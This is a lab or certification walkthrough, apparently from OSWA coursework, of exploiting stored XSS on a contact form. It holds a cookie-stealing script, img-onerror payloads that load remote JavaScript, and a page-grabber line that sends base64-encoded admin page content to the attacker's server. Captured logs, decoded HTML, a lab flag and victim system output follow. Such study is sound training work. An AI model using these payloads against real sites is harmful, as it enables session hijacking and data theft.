Our initial lead is `XSS` from the [[4. Burp Scan - XSS (Stored) - CSRF]], after testing we see that this payload `<img src='x' onerror='alert(1)'>`  causes a server error at the `http://construction/contact.html`

![[Pasted image 20250217185246.png]]
after submitting in these `two` fields it crashes the server - this means a potential `XSS`
![[Pasted image 20250217185341.png]]
using this payload to see if I can hit my web server being hosted
- using this payload to attempt to steal `admin` cookie
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:19]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss2.js     

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:43]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss2.js                  
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.223/exfil?data=" + encodedCookie)


# set up python server
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
this is the payload to `execute` to grab the `xss2.js` over to the server
```
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.166:80/xss2.js\'><\/script>');" />
```
was able to hit `python` server but nothing happened
![[Pasted image 20250218113626.png]]
trying to change the `xss2-1.js` to my IP
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:19]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss2.js     

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:43]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss2.js                  
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.166/exfil?data=" + encodedCookie)


# set up python server
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
this is the payload to `execute` to grab the `xss2.js` over to the server
```
<img src="1.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.166:80/xss3.js\'><\/script>');" />
```

### Walkthrough

the important part of identification of `XSS` is the `DOM` portion because I believe this determines what kind of `javascript` information that can be pulled
`pagegrabber.js` - we can identify this from our `burp scan` and alot of `XSS` in general is `DOM` based

![[Pasted image 20250221155919.png]]

now that we know that it is `DOM` based we know based off the `Objectives` that we need to steal the `source code` with `XSS`

![[Pasted image 20250221160027.png]]

this script is grabbing the body of the webpage (from the admin side) with `document.body.innerHTML` and `base64` encoding it with the `btoa` command
```js
window.location.href="http://192.168.45.166/a?b=" + btoa(window.document.body.innerHTML);
```

```bash

<script src=//192.168.45.166/pagegrabber.js>
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.166:80/payload.js\'><\/script>');" />

# this is the one that worked, keeping others for reference
<script src="http://192.168.45.166:80/pagegrabber.js"></script>
```

![[Pasted image 20250221155858.png]]
after  sending this, when we look back at our `python3` server we are able to see a message  with a `base64` encoded version of the source code.
![[Pasted image 20250224141523.png]]
copied and pasted
```bash
192.168.232.88 - - [24/Feb/2025 19:14:17] "GET /a?b=CiAgPGRpdiBjbGFzcz0iaGVyb19hcmVhIj4KICAgIDwhLS0gaGVhZGVyIHNlY3Rpb24gc3RyYXRzIC0tPgogICAgPGhlYWRlciBjbGFzcz0iaGVhZGVyX3NlY3Rpb24iPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgogICAgICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLWxnIGN1c3RvbV9uYXYtY29udGFpbmVyICI+CiAgICAgICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSJpbmRleC5odG1sIj4KICAgICAgICAgICAgPHNwYW4+CiAgICAgICAgICAgICAgSGV1c3Rvbm4KICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgPC9hPgogICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXIgbWwtYXV0byIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1jb250cm9scz0ibmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4KICAgICAgICAgIDwvYnV0dG9uPgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBzZSIgaWQ9Im5hdmJhclN1cHBvcnRlZENvbnRlbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggbXgtYXV0byBmbGV4LWNvbHVtbiBmbGV4LWxnLXJvdyBhbGlnbi1pdGVtcy1jZW50ZXIiPgogICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiAgIj4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gIj4KICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJpbmRleC5odG1sIj5Ib21lIDxzcGFuIGNsYXNzPSJzci1vbmx5Ij4oY3VycmVudCk8L3NwYW4+PC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gYWN0aXZlIj4KICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJhYm91dC5odG1sIj4gQWJvdXQgPC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9InNlcnZpY2UuaHRtbCI+IFNlcnZpY2VzIDwvYT4KICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJjb250YWN0Lmh0bWwiPkNvbnRhY3QgdXM8L2E+CiAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iaHR0cDovL2xvY2FsaG9zdDozMDAwL2E4NmU1NjA2MDFlNTMyOTM0MTE4YTEyNWRjYThhOWEwZmIyNmJjNDVhZGIzYmIzOGEzNzcyZGFhOGVmMjQ4YTMiPkRhc2hib2FyZCAoVW5kZXIgRGV2ZWxvcG1lbnQpPC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGZvcm0gY2xhc3M9ImZvcm0taW5saW5lIG15LTIgbXktbGctMCBtbC0wIG1sLWxnLTQgbWItMyBtYi1sZy0wIj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuICBteS0yIG15LXNtLTAgbmF2X3NlYXJjaC1idG4iIHR5cGU9InN1Ym1pdCI+PC9idXR0b24+CiAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9uYXY+CiAgICAgIDwvZGl2PgogICAgPC9oZWFkZXI+CiAgICA8IS0tIGVuZCBoZWFkZXIgc2VjdGlvbiAtLT4KICA8L2Rpdj4KCiAgPCEtLSBhYm91dCBzZWN0aW9uIC0tPgogIDxzZWN0aW9uIGNsYXNzPSJhYm91dF9zZWN0aW9uIGxheW91dF9wYWRkaW5nIj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxkaXYgY2xhc3M9ImN1c3RvbV9oZWFkaW5nLWNvbnRhaW5lciI+CgogICAgICAgIAogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8aDQ+Qm9va2luZyAxPC9oND4KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgbmFtZTogPHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LjQ1LjE2Njo4MC9wYWdlZ3JhYmJlci5qcyI+PC9zY3JpcHQ+PC9wPjwvdWw+PC9kaXY+PC9kaXY+PC9zZWN0aW9uPg== HTTP/1.1" 404 -
```
when we use the `BURP` decoder 
![[Pasted image 20250224141731.png]]
we  are able to see the `source` of the web page.
here we can see that our `script` to execute `pagegrabber.js` got injested into the `source code`
```html

  <div class="hero_area">
    <!-- header section strats -->
    <header class="header_section">
      <div class="container-fluid">
        <nav class="navbar navbar-expand-lg custom_nav-container ">
          <a class="navbar-brand" href="index.html">
            <span>
              Heustonn
            </span>
          </a>
          <button class="navbar-toggler ml-auto" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>

          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <div class="d-flex mx-auto flex-column flex-lg-row align-items-center">
              <ul class="navbar-nav  ">
                <li class="nav-item ">
                  <a class="nav-link" href="index.html">Home <span class="sr-only">(current)</span></a>
                </li>
                <li class="nav-item active">
                  <a class="nav-link" href="about.html"> About </a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="service.html"> Services </a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="contact.html">Contact us</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="http://localhost:3000/a86e560601e532934118a125dca8a9a0fb26bc45adb3bb38a3772daa8ef248a3">Dashboard (Under Development)</a>
                </li>
              </ul>
            </div>
          </div>
          <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">
            <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>
          </form>
        </nav>
      </div>
    </header>
    <!-- end header section -->
  </div>

  <!-- about section -->
  <section class="about_section layout_padding">
    <div class="container">
      <div class="custom_heading-container">

        
            <ul>
                <h4>Booking 1</h4>
                
                <p>
                    name: <script src="http://192.168.45.166:80/pagegrabber.js"></script></p></ul></div></div></section>
```
we can also see that `their` is a new endpoint disclosed in the source
![[Pasted image 20250224143025.png]]
this shows us `local.txt`

```bash
26dce31f17009b801fbfe9157245fd12
```

![[Pasted image 20250224143157.png]]

### Default Commands ran on the page
#### PS
```bash
PS:

        USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 101448 12260 ?        Ss   19:06   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    19:06   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   19:06   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   19:06   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   19:06   0:00 [netns]
root           7  0.0  0.0      0     0 ?        I<   19:06   0:00 [kworker/0:0H-events_highpri]
root           9  0.0  0.0      0     0 ?        I<   19:06   0:00 [kworker/0:1H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   19:06   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        S    19:06   0:00 [rcu_tasks_rude_]
root          12  0.0  0.0      0     0 ?        S    19:06   0:00 [rcu_tasks_trace]
root          13  0.0  0.0      0     0 ?        S    19:06   0:00 [ksoftirqd/0]
root          14  0.0  0.0      0     0 ?        I    19:06   0:00 [rcu_sched]
root          15  0.0  0.0      0     0 ?        S    19:06   0:00 [migration/0]
root          16  0.0  0.0      0     0 ?        S    19:06   0:00 [idle_inject/0]
root          18  0.0  0.0      0     0 ?        S    19:06   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    19:06   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    19:06   0:00 [idle_inject/1]
root          21  0.0  0.0      0     0 ?        S    19:06   0:00 [migration/1]
root          22  0.0  0.0      0     0 ?        S    19:06   0:00 [ksoftirqd/1]
root          24  0.0  0.0      0     0 ?        I<   19:06   0:00 [kworker/1:0H-events_highpri]
root          25  0.0  0.0      0     0 ?        S    19:06   0:00 [kdevtmpfs]
root          26  0.0  0.0      0     0 ?        I<   19:06   0:00 [inet_frag_wq]
root          27  0.0  0.0      0     0 ?        S    19:06   0:00 [kauditd]
root          28  0.0  0.0      0     0 ?        S    19:06   0:00 [khungtaskd]
root          29  0.0  0.0      0     0 ?        S    19:06   0:00 [oom_reaper]
root          30  0.0  0.0      0     0 ?        I<   19:06   0:00 [writeback]
root          31  0.0  0.0      0     0 ?        S    19:06   0:00 [kcompactd0]
root          32  0.0  0.0      0     0 ?        SN   19:06   0:00 [ksmd]
root          33  0.0  0.0      0     0 ?        SN   19:06   0:00 [khugepaged]
root          38  0.0  0.0      0     0 ?        I    19:06   0:00 [kworker/1:1-mm_percpu_wq]
root          80  0.0  0.0      0     0 ?        I<   19:06   0:00 [kintegrityd]
root          81  0.0  0.0      0     0 ?        I<   19:06   0:00 [kblockd]
root          82  0.0  0.0      0     0 ?        I<   19:06   0:00 [blkcg_punt_bio]
root          83  0.0  0.0      0     0 ?        I<   19:06   0:00 [tpm_dev_wq]
root          84  0.0  0.0      0     0 ?        I<   19:06   0:00 [ata_sff]
root          85  0.0  0.0      0     0 ?        I<   19:06   0:00 [md]
root          86  0.0  0.0      0     0 ?        I<   19:06   0:00 [edac-poller]
root          87  0.0  0.0      0     0 ?        I<   19:06   0:00 [devfreq_wq]
root          88  0.0  0.0      0     0 ?        S    19:06   0:00 [watchdogd]
root          91  0.0  0.0      0     0 ?        S    19:06   0:00 [kswapd0]
root          92  0.0  0.0      0     0 ?        S    19:06   0:00 [ecryptfs-kthrea]
root          94  0.0  0.0      0     0 ?        I<   19:06   0:00 [kthrotld]
root          95  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/24-pciehp]
root          96  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/25-pciehp]
root          97  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/26-pciehp]
root          98  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/27-pciehp]
root          99  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/28-pciehp]
root         100  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/29-pciehp]
root         101  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/30-pciehp]
root         102  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/31-pciehp]
root         103  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/32-pciehp]
root         104  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/33-pciehp]
root         105  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/34-pciehp]
root         106  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/35-pciehp]
root         107  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/36-pciehp]
root         108  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/37-pciehp]
root         109  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/38-pciehp]
root         110  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/39-pciehp]
root         111  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/40-pciehp]
root         112  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/41-pciehp]
root         113  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/42-pciehp]
root         114  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/43-pciehp]
root         115  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/44-pciehp]
root         116  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/45-pciehp]
root         117  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/46-pciehp]
root         118  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/47-pciehp]
root         119  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/48-pciehp]
root         120  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/49-pciehp]
root         121  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/50-pciehp]
root         122  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/51-pciehp]
root         123  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/52-pciehp]
root         124  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/53-pciehp]
root         125  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/54-pciehp]
root         126  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/55-pciehp]
root         127  0.0  0.0      0     0 ?        I<   19:06   0:00 [acpi_thermal_pm]
root         129  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_0]
root         130  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_0]
root         131  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_1]
root         132  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_1]
root         134  0.0  0.0      0     0 ?        I<   19:06   0:00 [vfio-irqfd-clea]
root         135  0.0  0.0      0     0 ?        I<   19:06   0:00 [kworker/1:1H-events_highpri]
root         136  0.0  0.0      0     0 ?        I<   19:06   0:00 [kstrp]
root         140  0.0  0.0      0     0 ?        I<   19:06   0:00 [zswap-shrink]
root         141  0.0  0.0      0     0 ?        I<   19:06   0:00 [kworker/u5:0]
root         146  0.0  0.0      0     0 ?        I<   19:06   0:00 [charger_manager]
root         191  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_2]
root         192  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_2]
root         193  0.0  0.0      0     0 ?        I<   19:06   0:00 [vmw_pvscsi_wq_2]
root         194  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_3]
root         195  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_3]
root         196  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_4]
root         197  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_4]
root         198  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_5]
root         199  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_5]
root         200  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_6]
root         201  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_6]
root         202  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_7]
root         203  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_7]
root         204  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_8]
root         205  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_8]
root         206  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_9]
root         207  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_9]
root         208  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_10]
root         209  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_10]
root         210  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_11]
root         211  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_11]
root         212  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_12]
root         213  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_12]
root         214  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_13]
root         215  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_13]
root         216  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_14]
root         217  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_14]
root         218  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_15]
root         219  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_15]
root         220  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_16]
root         221  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_16]
root         222  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_17]
root         223  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_17]
root         224  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_18]
root         225  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_18]
root         226  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_19]
root         227  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_19]
root         228  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_20]
root         229  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_20]
root         230  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_21]
root         231  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_21]
root         232  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_22]
root         233  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_22]
root         234  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_23]
root         235  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_23]
root         236  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_24]
root         237  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_24]
root         238  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_25]
root         239  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_25]
root         240  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_26]
root         241  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_26]
root         242  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_27]
root         243  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_27]
root         244  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_28]
root         245  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_28]
root         246  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_29]
root         247  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_29]
root         248  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_30]
root         249  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_30]
root         250  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_31]
root         251  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_31]
root         252  0.0  0.0      0     0 ?        S    19:06   0:00 [scsi_eh_32]
root         253  0.0  0.0      0     0 ?        I<   19:06   0:00 [scsi_tmf_32]
root         276  0.0  0.0      0     0 ?        I    19:06   0:00 [kworker/u4:27-events_power_efficient]
root         282  0.0  0.0      0     0 ?        I<   19:06   0:00 [cryptd]
root         316  0.0  0.0      0     0 ?        I<   19:06   0:00 [ttm_swap]
root         319  0.0  0.0      0     0 ?        S    19:06   0:00 [irq/16-vmwgfx]
root         324  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc0]
root         325  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc1]
root         326  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc2]
root         327  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc3]
root         328  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc4]
root         329  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc5]
root         330  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc6]
root         331  0.0  0.0      0     0 ?        S    19:06   0:00 [card0-crtc7]
root         343  0.0  0.0      0     0 ?        I<   19:06   0:00 [kdmflush]
root         374  0.0  0.0      0     0 ?        I<   19:06   0:00 [raid5wq]
root         421  0.0  0.0      0     0 ?        S    19:06   0:00 [jbd2/dm-0-8]
root         422  0.0  0.0      0     0 ?        I<   19:06   0:00 [ext4-rsv-conver]
root         485  0.0  0.2  47688 16288 ?        S<s  19:06   0:00 /lib/systemd/systemd-journald
root         509  0.0  0.0      0     0 ?        I    19:06   0:00 [kworker/1:3-events]
root         515  0.0  0.0      0     0 ?        I<   19:06   0:00 [kaluad]
root         517  0.0  0.0      0     0 ?        I<   19:06   0:00 [kmpath_rdacd]
root         519  0.0  0.0      0     0 ?        I<   19:06   0:00 [kmpathd]
root         521  0.0  0.0      0     0 ?        I<   19:06   0:00 [kmpath_handlerd]
root         522  0.0  0.0      0     0 ?        I    19:06   0:00 [kworker/0:3-events]
root         524  0.0  0.3 354888 27104 ?        SLsl 19:06   0:00 /sbin/multipathd -d -s
root         526  0.0  0.0  11336  6256 ?        Ss   19:06   0:00 /lib/systemd/systemd-udevd
root         665  0.0  0.0      0     0 ?        S    19:06   0:00 [jbd2/sda2-8]
root         666  0.0  0.0      0     0 ?        I<   19:06   0:00 [ext4-rsv-conver]
systemd+     682  0.0  0.0  89300  6492 ?        Ssl  19:06   0:00 /lib/systemd/systemd-timesyncd
root         687  0.0  0.1  48564 11740 ?        Ss   19:06   0:00 /usr/bin/VGAuthService
root         688  0.0  0.1 239592  9768 ?        Ssl  19:06   0:01 /usr/bin/vmtoolsd
systemd+     755  0.0  0.0  16180  8136 ?        Ss   19:06   0:00 /lib/systemd/systemd-networkd
systemd+     757  0.0  0.1  25348 12516 ?        Ss   19:06   0:00 /lib/systemd/systemd-resolved
message+     770  0.0  0.0   8596  4740 ?        Ss   19:06   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         776  0.0  0.2  30112 18752 ?        Ss   19:06   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         779  0.0  0.3  34144 27084 ?        Ss   19:06   0:00 /usr/bin/python3 /usr/bin/supervisord -n -c /etc/supervisor/supervisord.conf
root         780  0.0  0.0  14972  7200 ?        Ss   19:06   0:00 /lib/systemd/systemd-logind
root         805  0.0  0.1  15420  8892 ?        Ss   19:06   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         813  0.0  0.0   3192  1088 tty1     Ss+  19:06   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         820  0.0  0.2 107192 21364 ?        Ssl  19:06   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         867  0.0  0.3  32260 25756 ?        S    19:06   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:80 --workers=3 app:app
root         868  0.0  0.3  32260 25684 ?        S    19:06   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:3000 --workers=3 dashboard_app:dashboard_app
root         997  0.0  0.5  61664 47012 ?        S    19:08   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:80 --workers=3 app:app
root         998  0.0  0.5  61836 47020 ?        S    19:08   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:80 --workers=3 app:app
root         999  0.0  0.3  39768 30664 ?        S    19:08   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:3000 --workers=3 dashboard_app:dashboard_app
root        1000  0.0  0.5  59968 44744 ?        S    19:08   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:80 --workers=3 app:app
root        1001  0.0  0.3  39768 30720 ?        S    19:08   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:3000 --workers=3 dashboard_app:dashboard_app
root        1002  0.0  0.3  39768 30980 ?        S    19:08   0:00 /usr/bin/python3 /usr/bin/gunicorn3 --bind 0.0.0.0:3000 --workers=3 dashboard_app:dashboard_app
root        1169  0.0  0.0      0     0 ?        I    19:19   0:00 [kworker/u4:0-events_unbound]
root        1171  0.0  0.0      0     0 ?        I    19:21   0:00 [kworker/0:0-events]
root        1172  0.0  0.0      0     0 ?        I    19:25   0:00 [kworker/u4:1-flush-253:0]
root        1191  0.0  0.0      0     0 ?        I    19:29   0:00 [kworker/0:1-events]
root        1240  0.0  0.0      0     0 ?        I    19:29   0:00 [kworker/u4:2-events_unbound]
root        1241  0.0  0.0   7480  3188 ?        R    19:31   0:00 ps aux
```

#### IFCONFIG
```bash
Ifconfig:

      ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.232.88  netmask 255.255.255.0  broadcast 192.168.232.255
        ether 00:50:56:86:b4:ea  txqueuelen 1000  (Ethernet)
        RX packets 4684  bytes 398873 (398.8 KB)
        RX errors 0  dropped 348  overruns 0  frame 0
        TX packets 1143  bytes 1171652 (1.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 802  bytes 523883 (523.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 802  bytes 523883 (523.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
#### NETSTAT
```bash
Netstat:

      Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      805/sshd: /usr/sbin 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      867/python3         
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      868/python3         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      757/systemd-resolve 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           757/systemd-resolve 
```

